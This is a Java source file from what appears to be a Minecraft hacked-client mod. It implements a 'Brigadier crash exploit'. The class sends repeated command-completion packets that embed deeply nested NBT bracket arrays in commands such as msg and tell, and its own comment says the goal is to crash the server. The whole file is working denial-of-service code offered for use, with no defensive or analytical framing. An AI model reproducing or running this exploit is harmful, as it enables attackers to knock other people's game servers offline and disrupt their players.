package io.github.spigotrce.paradiseclientfabric.exploit.impl;

import io.github.spigotrce.paradiseclientfabric.Constants;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.exploit.Exploit;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

/**
 * This class represents a specific type of exploit that targets the Brigadier command system in Minecraft.
 * The exploit is designed to crash the game by sending a large number of command completion requests.
 *
 * @author spigotrce
 * @since 1.10
 */
public class BrigadierExploit extends Exploit {
    /**
     * The NBT executor string used in the command.
     */
    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";

    /**
     * An array of known working messages that can be used in the command.
     */
    private final String[] knownWorkingMessages =
            {
                    "msg",
                    "minecraft:msg",
                    "tell",
                    "minecraft:tell",
                    "tm",
                    "teammsg",
                    "minecraft:teammsg",
                    "minecraft:w",
                    "minecraft:me"
            };

    /**
     * The index of the current known working message being used.
     */
    private int messageIndex = 0;

    /**
     * Constructs a new BrigadierExploit instance.
     */
    public BrigadierExploit(MinecraftClient minecraftClient) {
        super("bridge-exploit", "Brigadier crash exploit", minecraftClient);
    }

    /**
     * Executes the exploit by sending a large number of command completion requests.
     */
    @Override
    public void execute() {
        try {
            new Thread(() ->
            {

                if (messageIndex == knownWorkingMessages.length) {
                    messageIndex = 0;
                    return;
                }

                try {
                    Thread.sleep(20);
                } catch (InterruptedException e) {
                    Constants.LOGGER.error("[CrashExploit] [Brigadier/Tab] Error while waiting for 1 tick", e);
                    Helper.printChatMessage("[CrashExploit] [Brigadier/Tab] Error while waiting for 1 tick " + e.getMessage());
                }

                String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
                int len = 2044 - knownMessage.length();
                String overflow = generateJsonObject(len);
                String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

                int packets = 10;
                for (int i = 0; i < packets; i++) {
                    Helper.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                    Helper.printChatMessage("[CrashExploit] [Brigadier/Tab] Packet " + i + " gesendet.");
                }
                messageIndex++;
            }).start();
        } catch (Exception e) {
            Helper.printChatMessage("Error while starting thread");
            Constants.LOGGER.error("Error while starting thread", e);
        }
    }

    /**
     * Generates a JSON object with a specified number of nested arrays.
     *
     * @param levels The number of nested arrays to generate.
     * @return The generated JSON object.
     */
    private String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());

        json = "{a:" + json + "}";
        return json;
    }
}
